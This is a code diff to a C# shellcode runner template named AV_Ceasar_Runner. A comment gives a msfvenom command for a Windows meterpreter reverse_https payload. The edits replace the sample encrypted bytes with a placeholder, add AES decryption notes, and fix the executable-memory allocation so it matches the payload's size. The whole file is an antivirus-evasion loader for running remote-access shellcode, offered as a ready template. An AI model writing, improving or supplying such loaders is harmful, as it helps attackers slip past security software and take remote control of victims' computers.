@@ -1,5 +1,5 @@
 // =============================================================================
-// TEMPLATE — replace buf with your encrypted shellcode before compiling
+// TEMPLATE - replace buf with your encrypted shellcode before compiling
 //
 // Generate and encrypt shellcode:
 //   1. msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f csharp
@@ -36,15 +36,22 @@ namespace AV_Ceasar_Runner
         static void Main(string[] args)
         {
             // Replace this with your actual encrypted shellcode bytes (IV + ciphertext from encryption)
-            // Example: byte[] buf = new byte[778] { 0xXX, 0xYY, ... }; // From ToMsfvenomCSharpFormat output
-            byte[] buf = new byte[778] { 0xfe, 0x4a, 0x85, 0xe6, 0xf2, 0xea, 0xce, 0x02, 0x02, 0x02, 0x43, 0x53, /* ... rest of your encrypted bytes ... */ };
+            // Minimum 32 bytes: 16-byte IV + at least 16-byte ciphertext (one AES block)
+            // Generate with: aes-shellcode-encryption/aes-shellcode-encryption.cs
+            byte[] buf = new byte[] {
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+            }; // TODO: paste your full encrypted bytes here (min 32 bytes: 16 IV + 16+ ciphertext)
 
             // Decrypt using AES (replaces the Caesar loop)
             byte[] decryptedShellcode = Decrypt(buf);
 
             int size = decryptedShellcode.Length;
 
-            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            // FIXED: use actual shellcode size, not hardcoded 0x1000
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);
 
             Marshal.Copy(decryptedShellcode, 0, addr, size);
 
